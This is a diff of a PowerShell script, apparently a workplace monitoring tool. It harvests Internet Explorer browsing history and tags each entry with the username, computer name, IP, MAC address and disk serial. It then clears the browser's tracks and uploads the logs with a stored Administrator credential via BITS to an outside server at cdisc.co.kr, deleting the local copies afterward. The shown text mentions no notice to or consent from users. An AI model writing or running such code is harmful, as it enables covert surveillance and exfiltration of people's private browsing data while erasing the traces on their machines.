@@ -2,35 +2,58 @@
 if(!(test-path 'C:\ProgramData\soalog'))
 {new-item -Path "C:\ProgramData\soalog" -ItemType Directory -Force }
 
-"DDDd"
     $env:hostIP = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.netadapter.status -ne "Disconnected"}).ipv4address.ipaddress 
     $env:hostMAC = (Get-NetAdapter | where-object -FilterScript {$_.HardwareInterface -eq "True" -and $_.Status -ne "Disconnected"} | Where-Object {$_.InterfaceDescription -notmatch "TEST"}).MacAddress 
-    "DDDd"
+    $sn = (Get-WMIObject win32_physicalmedia | Where-Object {$_.tag -match "PHYSICALDRIVE0"} | select SerialNumber).SerialNumber
+if ($sn -ne $null)
+{
+if ($sn -match " ")
+{
+$sn = $sn.split(" ")[-1]
+}
+else
+{
+$sn = $sn
+}
+}
+elseif ($sn -eq $null)
+{
+$sn = (Get-WMIObject win32_physicalmedia | Where-Object {$_.tag -match "PHYSICALDRIVE1"} | select SerialNumber).SerialNumber
+if ($sn -match " ")
+{
+$sn = $sn.split(" ")[-1]
+}
+else
+{
+$sn = $sn
+}
+}
+    
+    
+    
     $shell = New-Object -ComObject Shell.Application       
     $history = $shell.NameSpace(34)  
     $folder = $history.Self       
-            "DDDd"
     $history.Items() |          
         foreach {            
          if ($_.IsFolder) {   
            $siteFolder = $_.GetFolder        
            $siteFolder.Items() |       
            foreach {          
-           "DDDd" 
              $site = $_           
              if ($site.IsFolder) {   
                 $pageFolder  = $site.GetFolder      
                 $pageFolder.Items() |         
                 foreach {           
-                      "DDDd"
                       if($($site.Name) -ne "내 PC")
                        {
-                       "DDDd"
                        $datetime = "$($pageFolder.GetDetailsOf($_,2))"   
                        $visit_time = Get-Date $datetime -Format yyyy-MM-ddTHH:mm:ss+09:00
-                       $env:COMPUTERNAME + ":::;" + $env:username + ":::;"  + $env:hostIP + ':::;' + $env:hostMAC + ':::;'  +  $visit_time + ':::;' +
-                       $($site.Name) + ':::;' +$($pageFolder.GetDetailsOf($_,0)) + ':::;' + $($pageFolder.GetDetailsOf($_,1)) + ':::;'  | out-file C:\ProgramData\soalog\${env:COMPUTERNAME}_$(get-date -f yyyyMMddhhmm)_IEhistory.txt -Append -encoding utf8
-                       if ($History) { RunDll32.exe InetCpl.cpl, ClearMyTracksByProcess 1}  
+                       $sn + ":::;" + $env:COMPUTERNAME + ":::;" + $env:username + ":::;"  + $env:hostIP + ':::;' + $env:hostMAC + ':::;'  +  $visit_time + ':::;' +
+                       $($site.Name) + ':::;' +$($pageFolder.GetDetailsOf($_,0)) + ':::;' + $($pageFolder.GetDetailsOf($_,1)) + ':::;'  | out-file C:\ProgramData\soalog\${sn}_$(get-date -f yyyyMMddHH)_IEhistory.txt -Append -encoding utf8
+
+                       Start-Process -FilePath "C:\Windows\System32\rundll32.exe" -ArgumentList "InetCpl.cpl","ClearMyTracksByProcess 1" -NoNewWindow
+                     
                        }
 
                        #$split_date = $datetime.split(" ")      
@@ -56,3 +79,33 @@ if(!(test-path 'C:\ProgramData\soalog'))
          }            
     }  
   
+   if($?)
+    {
+        Import-Module bitstransfer
+        $enc = Get-Content C:\Windows\soa\enp.txt | ConvertTo-SecureString # specify the directory where the encrypted password file is located
+        $user = "Administrator" # server ID
+        $cred = New-Object System.Management.Automation.PSCredential($user,$enc)
+        $src = "C:\ProgramData\soalog\*_IEhistory.txt"
+        Get-ChildItem -path $src |
+        foreach {
+        $dst = "http://cdisc.co.kr:1024/soa/upload/$($_.name)" # server directory with write permissions
+        $job = Start-BitsTransfer -source $($_.FullName) -Destination $dst -Credential $cred -TransferType Upload -Asynchronous
+       while (($job.jobstate -eq "TransientError"))
+{
+sleep 10;
+Resume-BitsTransfer
+}
+while (($job.jobstate -eq "Transferring") -or ($job.jobstate -eq "Connecting")) `
+{sleep 10;}
+if ($job.JobState -eq "Transferred")
+{
+Remove-Item $($_.FullName)
+}
+Switch($job.jobstate)
+{
+"Transferred" {Complete-BitsTransfer -BitsJob $job}
+"TransientError" {Resume-BitsTransfer -BitsJob $job}
+"Error" {Resume-BitsTransfer -BitsJob $job}
+}
+        }
+    }
